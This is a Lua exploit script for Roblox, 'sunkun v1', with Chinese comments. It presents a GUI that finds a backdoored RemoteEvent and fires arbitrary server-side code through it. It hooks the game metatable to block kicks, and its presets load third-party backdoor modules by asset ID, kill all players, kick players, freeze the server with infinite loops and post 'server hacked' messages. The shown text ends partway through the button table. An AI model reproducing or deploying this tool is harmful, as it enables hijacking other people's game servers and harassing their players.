--[=[
    sunkun v1 - 高级后门检测与执行系统
    完整按钮版 - 30个预设按钮 + 120个直接执行按钮
    作者: sunkun
    版本: 1.3
]=]

-- 服务定义
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- 本地玩家
local LocalPlayer = Players.LocalPlayer

-- 安全防御系统初始化
local SecuritySystem = {
    AntiKick = true,
    AntiDeath = true,
    AntiRejoin = true,
    AntiBan = true,
    FirewallMode = false,
    RiskLevel = 0
}

-- 防御系统激活
local function ActivateSecuritySystem()
    -- 防踢系统
    if SecuritySystem.AntiKick then
        local mt = getrawmetatable(game)
        local oldNamecall = mt.__namecall
        setreadonly(mt, false)
        
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            if method == "Kick" or method == "kick" then
                warn("[sunkun] 尝试踢出被阻止")
                return nil
            end
            return oldNamecall(self, ...)
        end)
        setreadonly(mt, true)
    end
    
    -- 防死亡系统
    if SecuritySystem.AntiDeath then
        LocalPlayer.CharacterAdded:Connect(function(char)
            task.wait(0.5)
            if char then
                local humanoid = char:WaitForChild("Humanoid")
                humanoid.Died:Connect(function()
                    task.wait(2)
                    if LocalPlayer.Character then
                        LocalPlayer.Character:BreakJoints()
                    end
                end)
            end
        end)
    end
    
    -- 防重新加入
    if SecuritySystem.AntiRejoin then
        game:GetService("TeleportService").TeleportInitFailed:Connect(function()
            warn("[sunkun] 传送失败，正在重新加入...")
        end)
    end
    
    print("[sunkun] 安全防御系统已激活")
end

-- 主GUI创建
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "sunkun_v1"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- 检测UI
local DetectionFrame = Instance.new("Frame")
DetectionFrame.Name = "DetectionUI"
DetectionFrame.Size = UDim2.new(0, 500, 0, 350)
DetectionFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
DetectionFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
DetectionFrame.BackgroundTransparency = 0.1
DetectionFrame.Visible = true
DetectionFrame.Parent = ScreenGui

-- UI边框（红色）
local Border = Instance.new("UIStroke")
Border.Color = Color3.fromRGB(255, 0, 0)
Border.Thickness = 3
Border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Border.Parent = DetectionFrame

-- 圆角
local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = DetectionFrame

-- 标题
local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Text = "sunkun v1 - 后门检测系统"
Title.Size = UDim2.new(1, -20, 0, 50)
Title.Position = UDim2.new(0, 10, 0, 10)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.Parent = DetectionFrame

-- 进度条框架
local ProgressFrame = Instance.new("Frame")
ProgressFrame.Name = "ProgressFrame"
ProgressFrame.Size = UDim2.new(1, -40, 0, 30)
ProgressFrame.Position = UDim2.new(0, 20, 0, 100)
ProgressFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ProgressFrame.Parent = DetectionFrame

local ProgressCorner = Instance.new("UICorner")
ProgressCorner.CornerRadius = UDim.new(0, 15)
ProgressCorner.Parent = ProgressFrame

-- 进度条
local ProgressBar = Instance.new("Frame")
ProgressBar.Name = "ProgressBar"
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
ProgressBar.Parent = ProgressFrame

local ProgressBarCorner = Instance.new("UICorner")
ProgressBarCorner.CornerRadius = UDim.new(0, 15)
ProgressBarCorner.Parent = ProgressBar

-- 进度文本
local ProgressText = Instance.new("TextLabel")
ProgressText.Name = "ProgressText"
ProgressText.Text = "准备检测... 0%"
ProgressText.Size = UDim2.new(1, 0, 1, 0)
ProgressText.BackgroundTransparency = 1
ProgressText.TextColor3 = Color3.fromRGB(255, 255, 255)
ProgressText.Font = Enum.Font.Gotham
ProgressText.TextSize = 16
ProgressText.Parent = ProgressFrame

-- 检测按钮
local DetectButton = Instance.new("TextButton")
DetectButton.Name = "DetectButton"
DetectButton.Text = "开始检测后门"
DetectButton.Size = UDim2.new(0, 200, 0, 40)
DetectButton.Position = UDim2.new(0.5, -100, 0.5, 50)
DetectButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
DetectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DetectButton.Font = Enum.Font.GothamBold
DetectButton.TextSize = 18
DetectButton.Parent = DetectionFrame

local DetectButtonCorner = Instance.new("UICorner")
DetectButtonCorner.CornerRadius = UDim.new(0, 8)
DetectButtonCorner.Parent = DetectButton

-- 主UI（初始隐藏）
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainUI"
MainFrame.Size = UDim2.new(0, 800, 0, 500)
MainFrame.Position = UDim2.new(0.5, -400, 0.5, -250)
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainFrame.BackgroundTransparency = 0.05
MainFrame.Visible = false
MainFrame.Parent = ScreenGui

local MainBorder = Instance.new("UIStroke")
MainBorder.Color = Color3.fromRGB(0, 100, 255)
MainBorder.Thickness = 3
MainBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainBorder.Parent = MainFrame

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame

-- 主标题
local MainTitle = Instance.new("TextLabel")
MainTitle.Name = "MainTitle"
MainTitle.Text = "sunkun 执行器 v1"
MainTitle.Size = UDim2.new(1, -120, 0, 50)
MainTitle.Position = UDim2.new(0, 10, 0, 10)
MainTitle.BackgroundTransparency = 1
MainTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainTitle.Font = Enum.Font.GothamBold
MainTitle.TextSize = 28
MainTitle.Parent = MainFrame

-- 返回/去往按钮
local ToggleButton = Instance.new("TextButton")
ToggleButton.Name = "ToggleButton"
ToggleButton.Text = "返回检测"
ToggleButton.Size = UDim2.new(0, 100, 0, 40)
ToggleButton.Position = UDim2.new(1, -110, 0, 10)
ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 200)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 16
ToggleButton.Parent = MainFrame

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 8)
ToggleCorner.Parent = ToggleButton

-- 左侧分类栏
local CategoryFrame = Instance.new("Frame")
CategoryFrame.Name = "CategoryFrame"
CategoryFrame.Size = UDim2.new(0, 150, 1, -80)
CategoryFrame.Position = UDim2.new(0, 10, 0, 60)
CategoryFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
CategoryFrame.Parent = MainFrame

local CategoryCorner = Instance.new("UICorner")
CategoryCorner.CornerRadius = UDim.new(0, 8)
CategoryCorner.Parent = CategoryFrame

-- 分类按钮
local Categories = {"输入执行器", "sunkun", "设置"}
local CategoryButtons = {}

for i, name in ipairs(Categories) do
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Text = name
    btn.Size = UDim2.new(1, -20, 0, 40)
    btn.Position = UDim2.new(0, 10, 0, 10 + (i-1)*50)
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.Parent = CategoryFrame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    
    CategoryButtons[name] = btn
end

-- 右侧内容区域
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, -180, 1, -80)
ContentFrame.Position = UDim2.new(0, 170, 0, 60)
ContentFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
ContentFrame.Parent = MainFrame

local ContentCorner = Instance.new("UICorner")
ContentCorner.CornerRadius = UDim.new(0, 8)
ContentCorner.Parent = ContentFrame

-- 输入执行器页面（默认显示）
local ExecutorPage = Instance.new("ScrollingFrame")
ExecutorPage.Name = "ExecutorPage"
ExecutorPage.Size = UDim2.new(1, 0, 1, 0)
ExecutorPage.BackgroundTransparency = 1
ExecutorPage.ScrollBarThickness = 6
ExecutorPage.CanvasSize = UDim2.new(0, 0, 0, 600)
ExecutorPage.Visible = true
ExecutorPage.Parent = ContentFrame

-- 输入框
local CodeInput = Instance.new("TextBox")
CodeInput.Name = "CodeInput"
CodeInput.Text = "-- 在这里输入服务器端脚本其他的用的是ai"
CodeInput.Size = UDim2.new(1, -220, 0, 200)
CodeInput.Position = UDim2.new(0, 10, 0, 10)
CodeInput.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
CodeInput.TextColor3 = Color3.fromRGB(200, 200, 255)
CodeInput.Font = Enum.Font.Code
CodeInput.TextSize = 14
CodeInput.TextXAlignment = Enum.TextXAlignment.Left
CodeInput.TextYAlignment = Enum.TextYAlignment.Top
CodeInput.ClearTextOnFocus = false
CodeInput.MultiLine = true
CodeInput.Parent = ExecutorPage

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 6)
InputCorner.Parent = CodeInput

-- 功能按钮
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Name = "ExecuteButton"
ExecuteButton.Text = "1. 执行/注入"
ExecuteButton.Size = UDim2.new(0.3, -10, 0, 40)
ExecuteButton.Position = UDim2.new(0, 10, 0, 220)
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.Font = Enum.Font.GothamBold
ExecuteButton.TextSize = 16
ExecuteButton.Parent = ExecutorPage

local ClearButton = Instance.new("TextButton")
ClearButton.Name = "ClearButton"
ClearButton.Text = "2. 清空内容"
ClearButton.Size = UDim2.new(0.3, -10, 0, 40)
ClearButton.Position = UDim2.new(0.35, 0, 0, 220)
ClearButton.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearButton.Font = Enum.Font.GothamBold
ClearButton.TextSize = 16
ClearButton.Parent = ExecutorPage

local RedetectButton = Instance.new("TextButton")
RedetectButton.Name = "RedetectButton"
RedetectButton.Text = "3. 重新检测"
RedetectButton.Size = UDim2.new(0.3, -10, 0, 40)
RedetectButton.Position = UDim2.new(0.7, 0, 0, 220)
RedetectButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
RedetectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
RedetectButton.Font = Enum.Font.GothamBold
RedetectButton.TextSize = 16
RedetectButton.Parent = ExecutorPage

local function addButtonCorner(btn)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = btn
end

addButtonCorner(ExecuteButton)
addButtonCorner(ClearButton)
addButtonCorner(RedetectButton)

-- 右侧按钮列表
local ButtonScroll = Instance.new("ScrollingFrame")
ButtonScroll.Name = "ButtonScroll"
ButtonScroll.Size = UDim2.new(0, 200, 1, -20)
ButtonScroll.Position = UDim2.new(1, -210, 0, 10)
ButtonScroll.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ButtonScroll.ScrollBarThickness = 6
ButtonScroll.CanvasSize = UDim2.new(0, 0, 0, 30*30)
ButtonScroll.Parent = ExecutorPage

local ButtonList = Instance.new("UIListLayout")
ButtonList.Padding = UDim.new(0, 5)
ButtonList.SortOrder = Enum.SortOrder.LayoutOrder
ButtonList.Parent = ButtonScroll

-- 创建30个预设按钮（已经写好标题和代码）
local PresetButtons = {}
local PresetCommands = {
    -- 按钮1
    {title = "官理员", code = "require(7634392335)(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮2：require(7192763922).load("game")
    {title = "官理员v2", code = "require(7192763922).load(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮3
    {title = "k00pkidd v11", code = "require(15267263357).V11(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮4
    {title = "k00pkidd v9", code = "require(17145849501).v9(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮5
    {title = "ez", code = "require (17340805099).ez(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮6
    {title = "un", code = "require(123346690243826).unnn(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮7
    {title = "k00pkidd v4", code = "require(84939235098701):load(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮8
    {title = "k00pkidd v7", code = "require(119821432715260).ProjectJTIbyjondow665anditsnotskeletonsuperpriv3eo9k7(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮9
    {title = "RC7", code = "require(12350030542).RC7(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮10
    {title = "china", code = "require(138287700016800):CHINA(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮11
    {title = "bre4dguiV5", code = "require(16695338037).bre4dguiV5(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮12
    {title = "op", code = "require(127445614272366).op(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮13
    {title = "epikgui", code = "require(74852635933311).epikgui(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮14
    {title = "DNG", code = "require(0x5EDFB9C275C1).DNG(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮15
    {title = "c0ikazgui", code = "require(124486859624367):c0ikazgui(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮16
    {title = "public144anz", code = "require(15929053965):public144anz(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮17
    {title = "y00zepok", code = "require(80232830339999).y00zepok(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮18
    {title = "清除天空", code = "game:GetService(\"Lighting\"):WaitForChild(\"Sky\"):Destroy()"},
    
    -- 按钮19
    {title = "k00p77v4", code = "require(15833438747).k00p77v4(\"" .. LocalPlayer.Name .. "\")"},
    
    -- 按钮20
    {title = "踢出玩家", code = "game:GetService(\"Players\"):WaitForChild(\"Player\"):Kick()"},
    
    -- 按钮21
    {title = "disco", code = "local Lighting = game:GetService(\"Lighting\") local RunService = game:GetService(\"RunService\") while true do for i = 1, 10 do Lighting.Ambient = Color3.fromHSV(i/10, 1, 1) Lighting.OutdoorAmbient = Color3.fromHSV(i/10, 1, 1) Lighting.ClockTime = 0 wait(0.2) end end"},
    
    -- 按钮22
    {title = "无限循环", code = "while true do game:GetService(\"RunService\").Heartbeat:Wait() end"},
    
    -- 按钮23
    {title = "服务器公告", code = "local message = Instance.new(\"Message\") message.Text = \"服务器已被sunkun入侵\" message.Parent = workspace"},
    
    -- 按钮24
    {title = "kill", code = "for i,v in pairs(game:GetService(\"Players\"):GetPlayers()) do v.Character.Humanoid:TakeDamage(100) end"},
    
    -- 按钮25
    {title = "传送玩家", code = "game:GetService(\"Players\").LocalPlayer.Character:MoveTo(Vector3.new(0,100,0))"},
    
    -- 按钮26
    {title = "力场保护", code = "local forcefield = Instance.new(\"ForceField\") forcefield.Parent = game:GetService(\"Players\").LocalPlayer.Character"},
    
    -- 按钮27
    {title = "高空传送", code = "game:GetService(\"Players\").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,500,0)"},
    
    -- 按钮28
    {title = "火花效果", code = "for i=1,50 do Instance.new(\"Sparkles\", workspace).Parent = workspace end"},
    
    -- 按钮29
    {title = "表情动作", code = "game:GetService(\"Players\"):Chat(\"/e 庆祝 sunkun v1 发布!\")"},
    
    -- 按钮30
    {title = "hint消息", code = "local hint = Instance.new(\"Hint\") hint.Text = \"sunkun已入侵服务器\" hint.Parent = workspace"}
}

for i = 1, 30 do
    local btn = Instance.new("TextButton")
    btn.Name = "PresetButton_" .. i
    btn.Text = PresetCommands[i] and PresetCommands[i].title or "按钮 " .. i
    btn.Size = UDim2.new(1, -10, 0, 25)
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.LayoutOrder = i
    btn.Parent = ButtonScroll
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 4)
    btnCorner.Parent = btn
    
    -- 点击时上传代码到输入执行器
    btn.MouseButton1Click:Connect(function()
        if PresetCommands[i] and PresetCommands[i].code then
            CodeInput.Text = PresetCommands[i].code
        else
            CodeInput.Text = "-- 按钮 " .. i .. " 的代码\nprint(\"执行按钮 " .. i .. "\")"
        end
    end)
    
    PresetButtons[i] = btn
end

-- sunkun页面
local SunkunPage = Instance.new("ScrollingFrame")
SunkunPage.Name = "SunkunPage"
SunkunPage.Size = UDim2.new(1, 0, 1, 0)
SunkunPage.BackgroundTransparency = 1
SunkunPage.ScrollBarThickness = 8
SunkunPage.CanvasSize = UDim2.new(0, 0, 0, 2500)
SunkunPage.Visible = false
SunkunPage.Parent = ContentFrame

-- 背景图片
local BackgroundImage = Instance.new("ImageLabel")
BackgroundImage.Name = "BackgroundImage"
BackgroundImage.Image = "rbxassetid://134902782140905"
BackgroundImage.Size = UDim2.new(1, 0, 0, 150)
BackgroundImage.Position = UDim2.new(0, 0, 0, 0)
BackgroundImage.BackgroundTransparency = 1
BackgroundImage.ScaleType = Enum.ScaleType.Crop
BackgroundImage.Parent = SunkunPage

-- 标题
local SunkunTitle = Instance.new("TextLabel")
SunkunTitle.Name = "SunkunTitle"
SunkunTitle.Text = "sunkun 功能面板 - 120个直接执行按钮"
SunkunTitle.Size = UDim2.new(1, 0, 0, 50)
SunkunTitle.Position = UDim2.new(0, 0, 0, 160)
SunkunTitle.BackgroundTransparency = 1
SunkunTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
SunkunTitle.Font = Enum.Font.GothamBold
SunkunTitle.TextSize = 24
SunkunTitle.Parent = SunkunPage

-- 创建120个功能按钮（直接执行）
local SunkunButtons = {}
local SunkunButtonFrame = Instance.new("Frame")
SunkunButtonFrame.Name = "SunkunButtonFrame"
SunkunButtonFrame.Size = UDim2.new(1, -20, 0, 2200)
SunkunButtonFrame.Position = UDim2.new(0, 10, 0, 220)
SunkunButtonFrame.BackgroundTransparency = 1
SunkunButtonFrame.Parent = SunkunPage

local SunkunGrid = Instance.new("UIGridLayout")
SunkunGrid.CellPadding = UDim2.new(0, 5, 0, 5)
SunkunGrid.CellSize = UDim2.new(0, 180, 0, 40)
SunkunGrid.StartCorner = Enum.StartCorner.TopLeft
SunkunGrid.HorizontalAlignment = Enum.HorizontalAlignment.Center
SunkunGrid.Parent = SunkunButtonFrame

-- 后门检测变量
local BackdoorFound = false
local BackdoorRemote = nil

-- 执行代码函数
local function ExecuteCode(code)
    if not BackdoorFound or not BackdoorRemote then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "错误",
            Text = "未检测到后门，无法执行",
            Duration = 3
        })
        return false
    end
    
    local success, result = pcall(function()
        if BackdoorRemote:IsA("RemoteEvent") then
            BackdoorRemote:FireServer(code)
        elseif BackdoorRemote:IsA("RemoteFunction") then
            BackdoorRemote:InvokeServer(code)
        end
    end)
    
    if success then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "成功",
            Text = "代码已发送到服务器",
            Duration = 3
        })
        return true
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "错误",
            Text = "执行失败: " .. tostring(result),
            Duration = 5
        })
        return false
    end
end

-- 120个直接执行按钮的定义
local SunkunFunctions = {
    -- 第1-10个按钮
    [1] = {title = "欢迎消息", code = "game:GetService(\"Players\"):Chat(\"欢迎使用sunkun v1！\")"},
    [2] = {title = "服务器提示", code = "game:GetService(\"Players\"):Chat(\"服务器已被sunkun控制\")"},
    [3] = {title = "全员通知", code = "for i,v in pairs(game.Players:GetPlayers()) do v:Chat(\"sunkun v1 已激活\") end"},
    [4] = {title = "公告系统", code = [[local message = Instance.new("Message", workspace) message.Text = "sunkun v1 已激活" wait(5) message:Destroy()]]},
    [5] = {title = "提示系统", code = [[local hint = Instance.new("Hint", workspace) hint.Text = "sunkun 执行器" hint.Parent = workspace]]},
    [6] = {title = "清除聊天", code = "game:GetService(\"ReplicatedStorage\"):WaitForChild(\"DefaultChatSystemChatEvents\"):WaitForChild(\"ClearMessageOnChannel\"):FireServer(\"All\")"},
    [7] = {title = "玩家列表", code = [[for i,player in pairs(game.Players:GetPlayers()) do print(player.Name .. " | " .. player.UserId) end]]},
    [8] = {title = "踢出自己", code = "game:GetService(\"Players\").LocalPlayer:Kick(\"sunkun测试\")"},
    [9] = {title = "服务器时间", code = "print(\"服务器时间: \" .. os.time())"},
    [10] = {title = "游戏信息", code = "print(\"游戏名称: \" .. game.Name .. \" | 地点ID: \" .. game.PlaceId)"},
    
    -- 第11-20个按钮
    [11] = {title = "重力控制", code = "game:GetService(\"Workspace\").Gravity = 196.2"},
    [12] = {title = "零重力", code = "game:GetService(\"Workspace\").Gravity = 0"},
    [13] = {title = "超低重力", code = "game:GetService(\"Workspace\").Gravity = 50"},
    [14] = {title = "时间控制", code = "game:GetService(\"Lighting\").ClockTime = 12"},
    [15] = {title = "午夜模式", code = "game:GetService(\"Lighting\").ClockTime = 0"},
    [16] = {title = "亮度调整", code = "game:GetService(\"Lighting\").Brightness = 2"},
    [17] = {title = "黑暗模式", code = "game:GetService(\"Lighting\").Brightness = 0.1"},
    [18] = {title = "雾效调整", code = "game:GetService(\"Lighting\").FogEnd = 1000"},
    [19] = {title = "浓雾模式", code = "game:GetService(\"Lighting\").FogEnd = 100"},
    [20] = {title = "清除雾效", code = "game:GetService(\"Lighting\").FogEnd = 1000000"},
    
    -- 第21-30个按钮
    [21] = {title = "创建基地", code = [[local base = Instance.new("Part", workspace) base.Size = Vector3.new(100, 5, 100) base.Position = Vector3.new(0, 0, 0) base.Anchored = true base.BrickColor = BrickColor.new("Dark green")]]},
    [22] = {title = "生成方块", code = [[for x = -50, 50, 10 do for z = -50, 50, 10 do local part = Instance.new("Part", workspace) part.Size = Vector3.new(8, 8, 8) part.Position = Vector3.new(x, 10, z) part.Anchored = true part.BrickColor = BrickColor.Random() end end]]},
    [23] = {title = "彩色世界", code = [[for i,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") then v.BrickColor = BrickColor.Random() end end]]},
    [24] = {title = "透明世界", code = [[for i,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") then v.Transparency = 0.5 end end]]},
    [25] = {title = "反光世界", code = [[for i,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") then v.Material = Enum.Material.Neon end end]]},
    [26] = {title = "金属世界", code = [[for i,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") then v.Material = Enum.Material.Metal end end]]},
    [27] = {title = "爆炸中心", code = [[local explosion = Instance.new("Explosion", workspace) explosion.Position = Vector3.new(0, 5, 0) explosion.BlastRadius = 50 explosion.BlastPressure = 100000]]},
    [28] = {title = "烟花表演", code = [[for i = 1, 20 do local explosion = Instance.new("Explosion", workspace) explosion.Position = Vector3.new(math.random(-100, 100), math.random(10, 50), math.random(-100, 100)) explosion.BlastRadius = 10 wait(0.1) end]]},
    [29] = {title = "火花特效", code = [[for i = 1, 50 do local sparkles = Instance.new("Sparkles", workspace) sparkles.Parent = workspace:FindFirstChildWhichIsA("BasePart") or Instance.new("Part", workspace) wait(0.05) end]]},
    [30] = {title = "火焰特效", code = [[for i = 1, 20 do local fire = Instance.new("Fire", workspace) fire.Parent = workspace:FindFirstChildWhichIsA("BasePart") or Instance.new("Part", workspace) fire.Size = 10 wait(0.1) end]]},
    
    -- 第31-40个按钮
    [31] = {title = "烟雾特效", code = [[local smoke = Instance.new("Smoke", workspace) smoke.Parent = workspace:FindFirstChildWhichIsA("BasePart") or Instance.new("Part", workspace) smoke.Size = 5 smoke.Opacity = 0.5 smoke.RiseVelocity = 10]]},
    [32] = {title = "播放音乐", code = [[local sound = Instance.new("Sound", workspace) sound.SoundId = "rbxassetid://9125320435" sound.Volume = 1 sound.Looped = true sound:Play()]]},
    [33] = {title = "停止音乐", code = [[for i,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Stop() end end]]},
    [34] = {title = "创建光源", code = [[local light = Instance.new("PointLight", workspace) light.Parent = workspace:FindFirstChildWhichIsA("BasePart") or Instance.new("Part", workspace) light.Range = 50 light.Brightness = 1 light.Color = Color3.new(1, 1, 1)]]},
    [35] = {title = "彩色光源", code = [[for i = 1, 10 do local light = Instance.new("PointLight", workspace) light.Parent = Instance.new("Part", workspace) light.Range = 30 light.Brightness = 2 light.Color = Color3.new(math.random(), math.random(), math.random()) wait(0.1) end]]},
    [36] = {title = "聚光灯", code = [[local spotlight = Instance.new("SpotLight", workspace) spotlight.Parent = workspace:FindFirstChildWhichIsA("BasePart") or Instance.new("Part", workspace) spotlight.Range = 100 spotlight.Angle = 45 spotlight.Brightness = 5]]},
    [37] = {title = "表面光线", code = [[local surface = Instance.new("SurfaceLight", workspace) surface.Parent = workspace:FindFirstChildWhichIsA("BasePart") or Instance.new("Part", workspace) surface.Range = 50 surface.Brightness = 3 surface.Color = Color3.new(1, 0.5, 0)]]},
    [38] = {title = "清除特效", code = [[for i,v in pairs(workspace:GetDescendants()) do if v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then v:Destroy() end end]]},
    [39] = {title = "清除声音", code = [[for i,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Destroy() end end]]},
    [40] = {title = "清除光源", code = [[for i,v in pairs(workspace:GetDescendants()) do if v:IsA("PointLight") or v:IsA("SpotLight") or v:IsA("SurfaceLight") then v:Destroy() end end]]},
    
    -- 第41-50个按钮
    [41] = {title = "传送所有人", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then player.Character:MoveTo(Vector3.new(0, 100, 0)) end end]]},
    [42] = {title = "随机传送", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then player.Character:MoveTo(Vector3.new(math.random(-500, 500), math.random(10, 100), math.random(-500, 500))) end end]]},
    [43] = {title = "排成直线", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then player.Character:MoveTo(Vector3.new(0, 10, i * 10)) end end]]},
    [44] = {title = "围成圆圈", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then local angle = (i / #game.Players:GetPlayers()) * math.pi * 2 player.Character:MoveTo(Vector3.new(math.sin(angle) * 50, 10, math.cos(angle) * 50)) end end]]},
    [45] = {title = "高空坠落", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then player.Character:MoveTo(Vector3.new(0, 1000, 0)) end end]]},
    [46] = {title = "恢复位置", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then player.Character:MoveTo(Vector3.new(0, 10, 0)) end end]]},
    [47] = {title = "设置速度", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChild("Humanoid") then player.Character.Humanoid.WalkSpeed = 50 end end]]},
    [48] = {title = "设置跳跃", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChild("Humanoid") then player.Character.Humanoid.JumpPower = 100 end end]]},
    [49] = {title = "恢复速度", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChild("Humanoid") then player.Character.Humanoid.WalkSpeed = 16 end end]]},
    [50] = {title = "恢复跳跃", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChild("Humanoid") then player.Character.Humanoid.JumpPower = 50 end end]]},
    
    -- 第51-60个按钮
    [51] = {title = "力场保护", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then local ff = Instance.new("ForceField") ff.Parent = player.Character end end]]},
    [52] = {title = "移除力场", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then for i,v in pairs(player.Character:GetDescendants()) do if v:IsA("ForceField") then v:Destroy() end end end end]]},
    [53] = {title = "火花护体", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then local sparkles = Instance.new("Sparkles") sparkles.Parent = player.Character:FindFirstChildWhichIsA("BasePart") or player.Character:WaitForChild("HumanoidRootPart") end end]]},
    [54] = {title = "火焰护体", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then local fire = Instance.new("Fire") fire.Parent = player.Character:FindFirstChildWhichIsA("BasePart") or player.Character:WaitForChild("HumanoidRootPart") fire.Size = 5 end end]]},
    [55] = {title = "烟雾护体", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then local smoke = Instance.new("Smoke") smoke.Parent = player.Character:FindFirstChildWhichIsA("BasePart") or player.Character:WaitForChild("HumanoidRootPart") smoke.Size = 5 end end]]},
    [56] = {title = "光源护体", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then local light = Instance.new("PointLight") light.Parent = player.Character:FindFirstChildWhichIsA("BasePart") or player.Character:WaitForChild("HumanoidRootPart") light.Range = 20 light.Brightness = 2 end end]]},
    [57] = {title = "清除特效", code = [[for i,player in pairs(game.Players:GetPlayers()) do if player.Character then for i,v in pairs(player.Character:GetDescendants()) do if v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("PointLight") or v:IsA("ForceField") then v:Destroy() end end end end]]},
